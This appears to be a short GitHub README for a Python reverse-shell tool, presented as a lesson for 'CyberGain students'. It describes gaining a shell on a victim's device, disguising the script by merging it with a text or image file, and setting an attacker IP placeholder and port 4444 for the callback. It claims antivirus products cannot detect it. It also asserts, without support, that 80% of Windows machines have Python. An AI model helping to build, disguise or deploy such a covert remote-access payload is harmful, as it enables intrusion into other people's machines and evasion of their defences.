# Reverse_Shell_CyberGain
Today we have a special script for CyberGain students. Students will learn how to do some cyber attacks that include taking the shell of the victim's device and merging a .txt file or a merged image with this file.

Be sure that Python is present on the victim's machine. 80% of Windows machines have Python installed.
Also, before you do the trick that we will use, change the IP that the script will connect to, in line 8 you can open the file with .txt or in kali linxu by using nano Reverse_Shell_CyberGain.py

HOST = '<Attacker IP ADDRESS>' #Attacker_Machine_IP
PORT = 4444 #Port Listner Attacker

All antivriruses will not be able to recognize the shell that the tool is capable of. I was careful to do this step. you can understand the script and create similar to it and post it in ur Github account
